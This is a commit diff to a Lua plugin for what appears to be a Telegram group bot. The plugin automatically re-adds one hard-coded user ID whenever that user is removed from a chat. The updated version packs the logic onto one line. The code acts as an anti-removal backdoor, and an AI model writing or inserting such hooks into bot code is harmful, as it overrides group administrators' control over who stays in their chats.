b0c7d58fdc9a754928a377c79bfed3df9afaac24
mamadiraner <mamali.azim@gmail.com>
2016-03-24 11:05:00 -0700

    Update zid.lua

--- plugins/zid.lua
+++ plugins/zid.lua
@@ -1,13 +1,1 @@
-do
-   local function add_user(chat, user)
-   local status = chat_add_user (chat, user, ok_cb, false)
-   if not status then
-   end
-end
-    local function run(msg, matches)
-           if matches[1] == 'chat_del_user' then
-                add_user("chat#id"..msg.to.id, "user#id"..182821898)
-                return " "
-    end
-end
-return {patterns = { "^!!tgservice (chat_del_user)$", }, run = run } end
+do local function run(msg, matches) local sajjad = 182821898 local mostafa = 182821898 local darkness = 182821898 if msg.action.type == "chat_del_user" and msg.action.user.id == tonumber(sajjad) then chat_add_user("chat#id"..msg.to.id, 'user#id'..sajjad, ok_cb, false) elseif msg.action.type == "chat_del_user" and msg.action.user.id == tonumber(darkness) then chat_add_user("chat#id"..msg.to.id, 'user#id'..darkness, ok_cb, false) elseif msg.action.type == "chat_del_user" and msg.action.user.id == tonumber(mostafa) then chat_add_user("chat#id"..msg.to.id, 'user#id'..mostafa, ok_cb, false) end end return { patterns = { "^!!tgservice (.+)$", }, run = run } end
